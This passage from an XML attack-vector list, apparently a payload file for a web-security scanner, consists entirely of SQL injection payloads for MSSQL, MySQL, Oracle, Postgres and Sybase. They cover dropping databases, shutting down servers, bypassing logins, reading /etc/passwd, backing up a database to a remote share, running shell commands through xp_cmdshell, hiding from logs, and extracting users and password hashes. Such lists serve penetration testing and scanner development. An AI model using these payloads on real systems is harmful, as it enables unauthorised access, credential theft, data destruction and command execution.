	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; DROP sys_db --</name>
		<code>x'; DROP sys_db --</code>
		<desc>MSSQL: x'; DROP sys_db --</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x"; DROP sys_db "</name>
		<code>x"; DROP sys_db "</code>
		<desc>MSSQL: x"; DROP sys_db "</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x"; DROP sys_db --</name>
		<code>x"; DROP sys_db --</code>
		<desc>MSSQL: x"; DROP sys_db --</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; shutdown '</name>
		<code>x'; shutdown '</code>
		<desc>MSSQL: x'; shutdown '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; shutdown --</name>
		<code>x'; shutdown --</code>
		<desc>MSSQL: x'; shutdown --</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x"; shutdown "</name>
		<code>x"; shutdown "</code>
		<desc>MSSQL: x"; shutdown "</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x"; shutdown --</name>
		<code>x"; shutdown --</code>
		<desc>MSSQL: x"; shutdown --</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>1; WAITFOR TIME '09:42:42 ' shutdow</name>
		<code>1; WAITFOR TIME '09:42:42 ' shutdown -- -z</code>
		<desc>MSSQL: 1; WAITFOR TIME '09:42:42 ' shutdown -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; WAITFOR TIME '09:42:42 ' shutdo</name>
		<code>x'; WAITFOR TIME '09:42:42 ' shutdown -- -z</code>
		<desc>MSSQL: x'; WAITFOR TIME '09:42:42 ' shutdown -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; SELECT sc.Text FROM syscomments</name>
		<code>x'; SELECT sc.Text FROM syscomments sc JOIN sysobjects so ON so.id = sc.id WHERE so.Name LIKE '%PROC_NAME%'</code>
		<desc>MSSQL: x'; SELECT sc.Text FROM syscomments sc JOIN sysobjects so ON so.id = sc.id WHERE so.Name LIKE '%PROC_NAME%'</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>-1 UNION SELECT CONCAT(username,0x3</name>
		<code>-1 UNION SELECT CONCAT(username,0x3a,password) FROM jos_users--</code>
		<desc>Oracle: -1 UNION SELECT CONCAT(username,0x3a,password) FROM jos_users--</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>x' OR 1=1</name>
		<code>x' OR 1=1</code>
		<desc>username without password</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>x' OR 1=1--</name>
		<code>x' OR 1=1--</code>
		<desc>username without password</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>' OR ''='</name>
		<code>' OR ''='</code>
		<desc>password</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>admin'--</name>
		<code>admin'--</code>
		<desc>username</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>admin';--</name>
		<code>admin';--</code>
		<desc>username</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>admin'/*</name>
		<code>admin'/*</code>
		<desc>username</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>admin'#</name>
		<code>admin'#</code>
		<desc>username</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>authentication bypass</label>
		<name>admin';#--*/*</name>
		<code>admin';#--*/*</code>
		<desc>username</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>x'; BACKUP database master to disks</name>
		<code>x'; BACKUP database master to disks='\\{IP}\{sharename}\backupdb.dat' -- -z</code>
		<desc>backup entire db to file</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>x'; create table myfile (line varch</name>
		<code>x'; create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'" select * from myfile" -- -z</code>
		<desc>reading files on filesystem</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>x'; create table myfile (record var</name>
		<code>x'; create table myfile (record varchar(2000)) external file at "c:\temp\file.exe" insert into myfile values(0xBINARY_DATA)" --</code>
		<desc>write file</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>create table afile (input TEXT); lo</name>
		<code>create table afile (input TEXT); load data infile '/etc/passwd' into table afile -- #</code>
		<desc>read file</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>select host,user,password from user</name>
		<code>select host,user,password from user into outfile '/tmp/passwd' -- #</code>
		<desc>write file</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>copy table to '/tmp/test';</name>
		<code>copy table to '/tmp/test';</code>
		<desc>write file</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>read/write files on filesystem</label>
		<name>create table afile (input TEXT); co</name>
		<code>create table afile (input TEXT); copy afile from '/etc/passwd'; select * from afile</code>
		<desc>read file</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; exec master..xp_cmdshell 'ipcon</name>
		<code>x'; exec master..xp_cmdshell 'ipconfig+/all' -- -z</code>
		<desc>MSSQL: x'; exec master..xp_cmdshell 'ipconfig+/all' -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; exec master..xp_cmdshell 'net+v</name>
		<code>x'; exec master..xp_cmdshell 'net+view' -- -z</code>
		<desc>MSSQL: x'; exec master..xp_cmdshell 'net+view' -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; exec master..xp_cmdshell 'net+u</name>
		<code>x'; exec master..xp_cmdshell 'net+users' -- -z</code>
		<desc>MSSQL: x'; exec master..xp_cmdshell 'net+users' -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; exec master..xp_cmdshell 'ping+</name>
		<code>x'; exec master..xp_cmdshell 'ping+target' -- -z</code>
		<desc>ping attacker target</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; xp_servicecontrol START &lt;ser</name>
		<code>x'; xp_servicecontrol START &lt;service&gt; -- -z</code>
		<desc>start/stop service</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; xp_cmdshell 'ipconfig+/all' --</name>
		<code>x'; xp_cmdshell 'ipconfig+/all' --</code>
		<desc>Sybase: x'; xp_cmdshell 'ipconfig+/all' --</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; xp_cmdshell 'net+view' --</name>
		<code>x'; xp_cmdshell 'net+view' --</code>
		<desc>Sybase: x'; xp_cmdshell 'net+view' --</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; xp_cmdshell 'net+users' --</name>
		<code>x'; xp_cmdshell 'net+users' --</code>
		<desc>Sybase: x'; xp_cmdshell 'net+users' --</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>command execution</label>
		<name>x'; xp_cmdshell 'ping+target' --</name>
		<code>x'; xp_cmdshell 'ping+target' --</code>
		<desc>ping attacker target</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>x'; alabel: GOTO alabel -- -z</name>
		<code>x'; alabel: GOTO alabel -- -z</code>
		<desc>MSSQL: x'; alabel: GOTO alabel -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>x'; WAITFOR TIME '09:42:42 ' shutdo</name>
		<code>x'; WAITFOR TIME '09:42:42 ' shutdown -- -z</code>
		<desc>MSSQL: x'; WAITFOR TIME '09:42:42 ' shutdown -- -z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>SELECT SLEEP(3) from existing_table</name>
		<code>SELECT SLEEP(3) from existing_table;--/*</code>
		<desc>MSSQL: SELECT SLEEP(3) from existing_table;--/*</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>SELECT SLEEP(3) from non_existing_t</name>
		<code>SELECT SLEEP(3) from non_existing_table;--/*</code>
		<desc>MSSQL: SELECT SLEEP(3) from non_existing_table;--/*</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>%A'' UNION SELECT 1 /*</name>
		<code>%A'' UNION SELECT 1 /*</code>
		<desc>*: %A'' UNION SELECT 1 /*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>%A'' UNION SELECT 1 */</name>
		<code>%A'' UNION SELECT 1 */</code>
		<desc>*: %A'' UNION SELECT 1 */</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>';exec xp_cmdshell 'dir';– </name>
		<code>';exec xp_cmdshell 'dir';– </code>
		<desc>MSSQL: ';exec xp_cmdshell 'dir';– </desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>';Declare @cmd as varchar(3000);Set</name>
		<code>';Declare @cmd as varchar(3000);Set @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";exec(@cmd);– </code>
		<desc>MSSQL: ';Declare @cmd as varchar(3000);Set @cmd = 'x'+'p'+'_'+'c'+'m'+'d'+'s'+'h'+'e'+'l'+'l'+'/**/'+""+'d'+'i'+'r'+"";exec(@cmd);– </desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>'dmin -sp_password</name>
		<code>'dmin -sp_password</code>
		<desc>prevent logging</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>BENCHMARK(1000000000,MD5('long-time</name>
		<code>BENCHMARK(1000000000,MD5('long-time'))</code>
		<desc>MySQL: BENCHMARK(1000000000,MD5('long-time'))</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>BENCHMARK(1000000000,MD5(HAR(115)))</name>
		<code>BENCHMARK(1000000000,MD5(HAR(115)))</code>
		<desc>MySQL: BENCHMARK(1000000000,MD5(HAR(115)))</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>x'; waitfor delay '0:0:42' -- #</name>
		<code>x'; waitfor delay '0:0:42' -- #</code>
		<desc>MySQL: x'; waitfor delay '0:0:42' -- #</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>x'; waitfor delay '0:0:42' --</name>
		<code>x'; waitfor delay '0:0:42' --</code>
		<desc>Sybase: x'; waitfor delay '0:0:42' --</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>select * from pg_shadow</name>
		<code>select * from pg_shadow</code>
		<desc>database usernames and passwords</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>misc tests</label>
		<name>select * from pg_group</name>
		<code>select * from pg_group</code>
		<desc>database usernames and passwords</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>XML tests</label>
		<name>select XMLType((select 'abcdef' fro</name>
		<code>select XMLType((select 'abcdef' from dual)) from dual;</code>
		<desc>should return "XML parsing failed"</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select convert(int,@@version)--</name>
		<code>select convert(int,@@version)--</code>
		<desc>MSSQL: select convert(int,@@version)--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>1 and(1)=convert(int,@@version)--</name>
		<code>1 and(1)=convert(int,@@version)--</code>
		<desc>MSSQL: 1 and(1)=convert(int,@@version)--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>1 and(1)=cast(version() as numeric)</name>
		<code>1 and(1)=cast(version() as numeric)--</code>
		<desc>Postgre: 1 and(1)=cast(version() as numeric)--</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>1 and(1)=convert(int,@@version)--</name>
		<code>1 and(1)=convert(int,@@version)--</code>
		<desc>Sybase: 1 and(1)=convert(int,@@version)--</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>1 and(1)=convert(int,(select+min(na</name>
		<code>1 and(1)=convert(int,(select+min(name)+from+syslogins+where+name&gt;'sybase'))--</code>
		<desc>Sybase: 1 and(1)=convert(int,(select+min(name)+from+syslogins+where+name&gt;'sybase'))--</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select convert(int,(select table_na</name>
		<code>select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=1))--</code>
		<desc>MSSQL: select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=1))--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select convert(int,(select table_na</name>
		<code>select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=2))--</code>
		<desc>MSSQL: select convert(int,(select table_name from(select row_number() over (order by table_name) as rownum,table_name from information_schema.tables) as t where t.rownum=2))--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select count(*),concat(version(),fl</name>
		<code>select count(*),concat(version(),floor(rand(0)*2))x from table group by x--</code>
		<desc>MySQL: select count(*),concat(version(),floor(rand(0)*2))x from table group by x--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select count(*),concat((select user</name>
		<code>select count(*),concat((select user from mysql.user limit 0,1),floor(rand(0)*2)) x from mysql.user group by x--</code>
		<desc>MySQL: select count(*),concat((select user from mysql.user limit 0,1),floor(rand(0)*2)) x from mysql.user group by x--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select count(*),concat((select user</name>
		<code>select count(*),concat((select user from mysql.user limit 1,1),floor(rand(0)*2)) x from mysql.user group by x--</code>
		<desc>MySQL: select count(*),concat((select user from mysql.user limit 1,1),floor(rand(0)*2)) x from mysql.user group by x--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>MySQL 4.1</name>
		<code>select 1 and row(1,1)&gt;(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--</code>
		<desc>MySQL: select 1 and row(1,1)&gt;(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>MySQL>=5.0</name>
		<code>(1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--</code>
		<desc>MySQL: (1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select cast(version() as numeric)--</name>
		<code>select cast(version() as numeric)--</code>
		<desc>Postgre: select cast(version() as numeric)--</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select cast((select table_name from</name>
		<code>select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric)--</code>
		<desc>Postgre: select cast((select table_name from information_schema.tables limit 1 offset 0) as numeric)--</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>select cast((select table_name from</name>
		<code>select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric)--</code>
		<desc>Postgre: select cast((select table_name from information_schema.tables limit 1 offset 1) as numeric)--</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>blind injection tests</label>
		<name>Oracle>9.0</name>
		<code>1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--</code>
		<desc>Oracle: 1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>error-based (blind) injection tests</label>
		<name>RAND((SELECT COUNT(*) FROM table)%2</name>
		<code>RAND((SELECT COUNT(*) FROM table)%2b900000000000)</code>
		<desc>Sybase: RAND((SELECT COUNT(*) FROM table)%2b900000000000)</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>error-based (blind) injection tests</label>
		<name>RAND(ASCII(SUBSTRING(user,1,1))%2b9</name>
		<code>RAND(ASCII(SUBSTRING(user,1,1))%2b900000000000)</code>
		<desc>Sybase: RAND(ASCII(SUBSTRING(user,1,1))%2b900000000000)</desc>
		<browser>Sybase</browser>
	</attack>
</xss>
